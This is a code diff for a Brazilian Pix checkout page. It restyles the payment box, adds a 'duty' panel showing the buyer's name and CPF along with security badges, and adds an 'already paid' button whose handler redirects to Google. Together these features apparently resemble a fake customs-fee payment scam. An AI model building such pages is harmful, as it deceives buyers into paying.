@@ -500,24 +500,59 @@
             color: var(--text-dark);
         }
 
+        .pix-code-display-wrapper {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+
+        .pix-code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pix-code-label {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--text-light);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .pix-code-value-label {
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
         .pix-code-input-container {
             display: flex;
             align-items: center;
             gap: 10px;
-            background: #f1f5f9;
-            padding: 12px;
-            border-radius: 10px;
+            background: white;
             border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 12px 14px;
+            transition: all 0.2s ease;
+        }
+
+        .pix-code-input-container:hover {
+            border-color: var(--primary);
+            box-shadow: 0 2px 8px rgba(50, 188, 173, 0.1);
         }
 
         .pix-code-display-text {
-            flex: 1;
-            font-family: monospace;
-            font-size: 0.85rem;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 0.75rem;
             color: var(--text-dark);
+            white-space: nowrap;
             overflow: hidden;
             text-overflow: ellipsis;
-            white-space: nowrap;
+            flex: 1;
+            letter-spacing: 0.3px;
+            line-height: 1.3;
         }
 
         .pix-copy-icon-btn {
@@ -526,24 +561,44 @@
             color: var(--primary);
             font-size: 1.1rem;
             cursor: pointer;
-            padding: 4px;
+            padding: 4px 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .pix-copy-icon-btn:hover {
+            color: var(--primary);
+            transform: scale(1.1);
+        }
+
+        .pix-copy-icon-btn.copied {
+            color: var(--success);
         }
 
         .btn-copy-pix {
-            background: var(--primary);
-            color: white;
+            background: #FFC107;
+            color: #1a1a1a;
             border: none;
-            padding: 18px 10px;
-            border-radius: 16px;
-            font-size: 1rem;
-            font-weight: 900;
+            padding: 14px 20px;
+            border-radius: 25px;
+            font-weight: 800;
+            font-size: 0.95rem;
             cursor: pointer;
-            box-shadow: 0 8px 20px rgba(0, 85, 255, 0.25);
             transition: all 0.3s ease;
-            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
             width: 100%;
-            display: block;
-            text-align: center;
+        }
+
+        .btn-copy-pix:hover {
+            background: #FFB300;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
         }
 
         .btn-copy-pix:active {
@@ -555,7 +610,9 @@
             align-items: center;
             justify-content: center;
             gap: 12px;
-            margin-top: 10px;
+            padding: 10px;
+            background: rgba(0, 85, 255, 0.05);
+            border-radius: 10px;
         }
 
         .modern-spinner {
@@ -570,7 +627,91 @@
         .waiting-text {
             font-size: 0.85rem;
             font-weight: 700;
+            color: var(--primary);
+        }
+
+        .duty-info-section {
+            background: #fff;
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .duty-header {
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 8px;
+        }
+
+        .duty-user-data {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .duty-field {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            color: var(--text-dark);
+        }
+
+        .duty-label {
+            font-weight: 600;
             color: var(--text-gray);
+        }
+
+        .duty-value {
+            font-weight: 700;
+            text-align: right;
+        }
+
+        .duty-warning {
+            font-size: 0.75rem;
+            color: var(--text-gray);
+            margin-top: 12px;
+            line-height: 1.4;
+            background: rgba(0, 0, 0, 0.03);
+            padding: 10px 12px;
+            border-radius: 8px;
+            border-left: 3px solid var(--pix-color);
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .duty-warning i {
+            color: var(--primary);
+            margin-top: 2px;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 5px;
+            opacity: 0.7;
+        }
+
+        .security-badge {
+            font-size: 0.65rem;
+            font-weight: 700;
+            color: var(--text-light);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .security-badge i {
+            color: var(--success);
         }
 
         @keyframes spin {
@@ -1727,7 +1868,6 @@ function renderOrderSummary() {
                                     <div class="duty-user-data">
                                         <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
                                         <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
-
                                     </div>
                                     <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
                                 </div>
@@ -1738,11 +1878,12 @@ function renderOrderSummary() {
                                     </div>
                                     <div class="pix-code-input-container">
                                         <span class="pix-code-display-text" id="pix-code-text">Aguardando código...</span>
-                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código Pix"><i class="fas fa-copy"></i></button>
+                                        <button class="pix-copy-icon-btn" id="btn-copy-pix-quick" title="Copiar código"><i class="fas fa-copy"></i></button>
                                     </div>
                                 </div>
-                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código Pix</button>
+                                <button class="btn-copy-pix" id="btn-copy-pix-action">Copiar código</button>
                                 <div class="waiting-payment-section"><div class="modern-spinner"></div><div class="waiting-text">Aguardando Pagamento</div></div>
+                                <button class="btn-modal-continue" id="btn-already-paid" style="margin-top: 10px; padding: 14px; border-radius: 12px; font-size: 0.95rem; border: none; cursor: pointer; width: 100%; font-weight: 800;">Já realizei o pagamento</button>
                             </div>
                         </div>
                         <div class="payment-option-card" id="pay-on-delivery">
@@ -1798,6 +1939,18 @@ function renderOrderSummary() {
             const quickCopyBtn = document.getElementById('btn-copy-pix-quick');
             if (quickCopyBtn) quickCopyBtn.addEventListener('click', (e) => { e.preventDefault(); copyPixCode(); });
             document.getElementById('btn-already-paid').addEventListener('click', () => { window.location.href = 'https://www.google.com'; });
+        }
+
+        function showPixCopySection(pixCode, name, cpf) {
+            document.getElementById('pix-original-content').style.display = 'none';
+            const copySection = document.getElementById('pix-copy-content');
+            copySection.style.display = 'flex';
+            document.getElementById('pix-code-text').textContent = pixCode;
+            document.getElementById('display-pix-name').textContent = name;
+            document.getElementById('display-pix-cpf').textContent = cpf;
+            
+            // Rola para o topo da seção de pagamento para melhor visibilidade
+            document.getElementById('pay-now-pix').scrollIntoView({ behavior: 'smooth', block: 'start' });
         }
 
         function startPixTimer(durationInSeconds) {
